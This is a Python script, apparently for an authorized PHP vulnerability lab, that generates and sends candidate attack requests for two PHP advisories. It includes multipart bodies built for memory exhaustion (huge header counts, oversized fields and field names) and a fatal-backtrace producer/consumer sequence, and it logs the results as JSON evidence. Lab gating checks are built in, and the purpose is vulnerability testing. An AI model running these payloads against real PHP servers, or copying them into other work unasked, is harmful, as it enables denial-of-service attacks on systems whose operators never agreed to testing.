#!/usr/bin/env python3
"""Attack-side request recorder for an authorized PHP CVE lab.

Inputs follow candidate paths in the two official advisories.
"""

import argparse
from datetime import datetime, timezone
import hashlib
import http.client
import json
import os
import secrets
import ssl
import sys
import time
from pathlib import Path
from urllib.parse import urlsplit


BOUNDARY = "php-official-cve-lab"
MAX_RESPONSE_BYTES = 2048
def parse_target(spec):
    try:
        parsed = urlsplit(spec)
        if parsed.username or parsed.password:
            raise ValueError("target must not include credentials")
        hostname = parsed.hostname
        port = parsed.port or (443 if parsed.scheme == "https" else 80)
    except ValueError as exc:
        raise ValueError("target must be a valid HTTP(S) lab URL") from exc
    if parsed.scheme not in ("http", "https"):
        raise ValueError("target must be an HTTP(S) URL")
    if parsed.query or parsed.fragment:
        raise ValueError("put endpoint paths in --health/--producer/--consumer/--upload")
    if not hostname:
        raise ValueError("target must include a hostname or IP")
    if not 1 <= port <= 65535:
        raise ValueError("target port must be 1..65535")
    prefix = parsed.path.rstrip("/")
    if ".." in prefix.split("/"):
        raise ValueError("target path cannot contain parent traversal")
    return parsed.scheme, hostname, port, prefix


def endpoint_path(prefix, endpoint):
    parsed = urlsplit(endpoint)
    if parsed.scheme or parsed.netloc or parsed.fragment or ".." in parsed.path.split("/"):
        raise ValueError("endpoint must be a relative application path")
    path = prefix + "/" + parsed.path.lstrip("/")
    return path + ("?" + parsed.query if parsed.query else "")


def multipart_part_headers(count):
    head = [
        f"--{BOUNDARY}\r\n",
    ]
    head.extend(f"X-{index}: v\r\n" for index in range(count))
    head.append('Content-Disposition: form-data; name="f"\r\n\r\nv\r\n')
    head.append(f"--{BOUNDARY}--\r\n")
    return "".join(head).encode("ascii")


def multipart_empty_files(count):
    parts = []
    for index in range(count):
        parts.append(
            f"--{BOUNDARY}\r\n"
            f'Content-Disposition: form-data; name="f[{index}][x]"; filename=""\r\n'
            "Content-Type: application/octet-stream\r\n\r\n\r\n"
        )
    parts.append(f"--{BOUNDARY}--\r\n")
    return "".join(parts).encode("ascii")


def multipart_form_value(size):
    head = (f"--{BOUNDARY}\r\n"
            'Content-Disposition: form-data; name="f"\r\n\r\n').encode("ascii")
    tail = f"\r\n--{BOUNDARY}--\r\n".encode("ascii")
    return head + b"x" * size + tail


def multipart_files_registration(pad_size, field_name_size):
    prelude = (f"--{BOUNDARY}\r\n"
               'Content-Disposition: form-data; name="pad"\r\n\r\n').encode("ascii")
    file_head = (f"\r\n--{BOUNDARY}\r\n"
                 'Content-Disposition: form-data; name="').encode("ascii")
    file_tail = ("[k]" + '"; filename="f.txt"\r\n'
                 "Content-Type: text/plain\r\n\r\nx\r\n"
                 f"--{BOUNDARY}--\r\n").encode("ascii")
    return prelude + b"x" * pad_size + file_head + b"A" * field_name_size + file_tail


def send(scheme, host, port, method, path, timeout, ca_file, request_id,
         body=None, content_type=None):
    headers = {"User-Agent": "php-official-cve-lab/1", "X-CVE-Lab-Request": request_id}
    if content_type:
        headers["Content-Type"] = content_type
    started = time.monotonic()
    connection = None
    try:
        if scheme == "https":
            context = ssl.create_default_context(cafile=ca_file)
            connection = http.client.HTTPSConnection(host, port, timeout=timeout, context=context)
        else:
            connection = http.client.HTTPConnection(host, port, timeout=timeout)
        connection.request(method, path, body=body, headers=headers)
        response = connection.getresponse()
        data = response.read(MAX_RESPONSE_BYTES + 1)
        prefix = data[:MAX_RESPONSE_BYTES]
        result = {
            "http_status": response.status,
            "reason": response.reason,
            "worker_pid_header": response.getheader("X-Lab-Worker-Pid"),
            "server_header": response.getheader("Server"),
            "content_type": response.getheader("Content-Type"),
            "body_prefix": prefix.decode("utf-8", "replace"),
            "body_prefix_sha256": hashlib.sha256(prefix).hexdigest(),
            "body_truncated": len(data) > MAX_RESPONSE_BYTES,
        }
    except (OSError, ValueError, http.client.HTTPException) as exc:
        result = {"transport_error": f"{type(exc).__name__}: {exc}"}
    finally:
        if connection is not None:
            connection.close()
    result["elapsed_ms"] = round((time.monotonic() - started) * 1000)
    return result


def persist(report_path, report, run_id):
    if report_path is None:
        return
    temporary = report_path.with_name(report_path.name + f".{run_id}.tmp")
    with temporary.open("x", encoding="utf-8") as handle:
        handle.write(json.dumps(report, ensure_ascii=False, indent=2) + "\n")
    os.replace(temporary, report_path)


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("mode", choices=("109618", "109619"))
    parser.add_argument("--target", required=True, help="HTTP(S) lab URL")
    parser.add_argument("--health", default="health.php")
    parser.add_argument("--producer", default="fatal-backtrace.php")
    parser.add_argument("--consumer", default="health.php")
    parser.add_argument("--upload", default="upload.php")
    parser.add_argument("--part-headers", type=int, default=5000,
                        help="109618 candidate multipart header count, 1..150000")
    parser.add_argument("--oom-strategy", choices=("part-headers", "empty-files", "form-value", "files-registration"),
                        default="part-headers")
    parser.add_argument("--empty-files", type=int, default=500,
                        help="109618 empty file control count, 1..10000")
    parser.add_argument("--field-bytes", type=int, default=6 * 1024 * 1024,
                        help="109618 form-value field size, 1..7340032 bytes")
    parser.add_argument("--pad-kib", type=int, default=1340,
                        help="109618 files-registration preceding field size, 0..2048 KiB")
    parser.add_argument("--field-name-kib", type=int, default=700,
                        help="109618 files-registration file field name size, 1..1024 KiB")
    parser.add_argument("--timeout", type=float, default=15.0)
    parser.add_argument("--expected-php", default="8.5.11")
    parser.add_argument("--expected-sapi", default="apache2handler")
    parser.add_argument("--ca-file", type=Path, help="CA certificate for an HTTPS lab")
    parser.add_argument("--report", type=Path, help="Save the JSON evidence record")
    parser.add_argument("--execute", action="store_true", help="Send candidate requests")
    args = parser.parse_args()

    try:
        scheme, host, port, prefix = parse_target(args.target)
        paths = {
            "health": endpoint_path(prefix, args.health),
            "producer": endpoint_path(prefix, args.producer),
            "consumer": endpoint_path(prefix, args.consumer),
            "upload": endpoint_path(prefix, args.upload),
        }
    except ValueError as exc:
        parser.error(str(exc))
    if args.part_headers < 1:
        parser.error("--part-headers must be >= 1")
    if args.empty_files < 1:
        parser.error("--empty-files must be >= 1")
    if args.field_bytes < 1:
        parser.error("--field-bytes must be >= 1")
    if args.pad_kib < 0:
        parser.error("--pad-kib must be >= 0")
    if args.field_name_kib < 1:
        parser.error("--field-name-kib must be >= 1")
    if not 0.5 <= args.timeout <= 60:
        parser.error("--timeout must be 0.5..60 seconds")
    if args.ca_file and not args.ca_file.is_file():
        parser.error("--ca-file does not exist")
    if args.report and not args.report.parent.is_dir():
        parser.error("--report parent directory does not exist")

    run_id = secrets.token_hex(8)
    report_path = args.report or (Path.cwd() / f"cve-lab-{args.mode}-{run_id}.json" if args.execute else None)
    report = {
        "tool": "official-cve-lab attacker-side diagnostic probe",
        "run_id": run_id,
        "observed_at_utc": datetime.now(timezone.utc).isoformat(),
        "mode": args.mode,
        "target": args.target,
        "expected_php": args.expected_php,
        "expected_sapi": args.expected_sapi,
        "endpoints": paths,
        "executed": args.execute,
        "candidate_attempted": False,
        "candidate_response_received": False,
        "verdict": "not_determined; HTTP evidence alone cannot confirm a CVE",
        "steps": [],
    }
    body = None
    if args.mode == "109618":
        if args.oom_strategy == "part-headers":
            body = multipart_part_headers(args.part_headers)
        elif args.oom_strategy == "empty-files":
            body = multipart_empty_files(args.empty_files)
        elif args.oom_strategy == "form-value":
            body = multipart_form_value(args.field_bytes)
        else:
            body = multipart_files_registration(args.pad_kib * 1024,
                                                args.field_name_kib * 1024)
        report["candidate"] = {
            "oom_strategy": args.oom_strategy,
            "body_bytes": len(body),
            "body_sha256": hashlib.sha256(body).hexdigest(),
        }
        if args.oom_strategy == "part-headers":
            report["candidate"]["multipart_part_headers"] = args.part_headers
        elif args.oom_strategy == "empty-files":
            report["candidate"]["empty_file_controls"] = args.empty_files
        elif args.oom_strategy == "form-value":
            report["candidate"]["form_value_bytes"] = args.field_bytes
        else:
            report["candidate"]["pad_bytes"] = args.pad_kib * 1024
            report["candidate"]["file_field_name_bytes"] = args.field_name_kib * 1024

    if report_path is not None:
        try:
            with report_path.open("x", encoding="utf-8") as handle:
                handle.write(json.dumps(report, ensure_ascii=False, indent=2) + "\n")
        except FileExistsError:
            parser.error(f"report already exists: {report_path}")

    try:
        if args.execute:
            plan = [("baseline", "GET", paths["health"], None, None)]
            if args.mode == "109618":
                plan.append(("multipart_candidate", "POST", paths["upload"], body,
                             f"multipart/form-data; boundary={BOUNDARY}"))
                plan.append(("after", "GET", paths["health"], None, None))
            else:
                plan.extend([
                    ("consumer_preflight", "GET", paths["consumer"], None, None),
                    ("fatal_producer", "GET", paths["producer"], None, None),
                    ("early_consumer", "GET", paths["consumer"], None, None),
                ])
            for step_name, method, path, payload, content_type in plan:
                request_id = f"{run_id}-{step_name}"
                report["in_flight_step"] = step_name
                if step_name in ("multipart_candidate", "fatal_producer"):
                    report["candidate_attempted"] = True
                persist(report_path, report, run_id)
                result = send(scheme, host, port, method, path, args.timeout,
                              str(args.ca_file) if args.ca_file else None,
                              request_id, payload, content_type)
                report.pop("in_flight_step", None)
                report["steps"].append({"step": step_name, "request_id": request_id,
                                        "method": method, "path": path, "result": result})
                if step_name in ("multipart_candidate", "fatal_producer"):
                    report["candidate_response_received"] = "http_status" in result
                persist(report_path, report, run_id)
                if step_name in ("baseline", "consumer_preflight"):
                    try:
                        health = json.loads(result.get("body_prefix", ""))
                    except (json.JSONDecodeError, TypeError):
                        health = {}
                    if not isinstance(health, dict):
                        health = {}
                    observed = {
                        "lab_marker": health.get("lab"),
                        "php": health.get("php"),
                        "sapi": health.get("sapi"),
                        "memory_limit": health.get("memory_limit"),
                        "fatal_error_backtraces": health.get("fatal_error_backtraces"),
                        "auto_detect_line_endings": health.get("auto_detect_line_endings"),
                    }
                    if step_name == "baseline":
                        report["preflight"] = observed
                    else:
                        report["consumer_preflight"] = observed
                    if result.get("http_status") != 200:
                        report["stopped_reason"] = f"{step_name} endpoint returned non-200"
                        break
                    if (health.get("lab") != "official-cve-lab-v1" or
                            health.get("php") != args.expected_php or
                            health.get("sapi") != args.expected_sapi):
                        report["stopped_reason"] = f"{step_name} lab/version/SAPI mismatch"
                        break
                    if step_name == "baseline" and args.mode == "109619":
                        if not str(health.get("php", "")).startswith("8.5."):
                            report["stopped_reason"] = "109619 fatal-backtrace path requires PHP 8.5"
                            break
                        if str(health.get("fatal_error_backtraces", "")).lower() not in ("1", "on"):
                            report["stopped_reason"] = "fatal_error_backtraces is not enabled"
                            break
                        if paths["consumer"] == paths["health"]:
                            report["stopped_reason"] = "109619 requires a separate early consumer endpoint"
                            break
                    if (step_name == "consumer_preflight" and
                            str(health.get("auto_detect_line_endings", "")).lower() not in ("1", "on")):
                        report["stopped_reason"] = "early consumer INI setting is not enabled"
                        break
                if step_name == "fatal_producer":
                    body_text = result.get("body_prefix", "") or ""
                    observed_fatal = (result.get("http_status", 0) >= 500 or
                                      "CVE_LAB_BACKTRACE_FATAL" in body_text)
                    report["fatal_producer_observed"] = observed_fatal
                    if not observed_fatal:
                        report["stopped_reason"] = "fatal producer outcome not observed; consumer not sent"
                        persist(report_path, report, run_id)
                        break
    except KeyboardInterrupt:
        report["interrupted"] = True
    except Exception as exc:
        report["internal_error"] = f"{type(exc).__name__}: {exc}"
    finally:
        persist(report_path, report, run_id)

    output = json.dumps(report, ensure_ascii=False, indent=2)
    print(output)
    if report_path:
        print(f"Saved report: {report_path}", file=sys.stderr)
    if report.get("interrupted") or report.get("internal_error"):
        sys.exit(1)


if __name__ == "__main__":
    main()
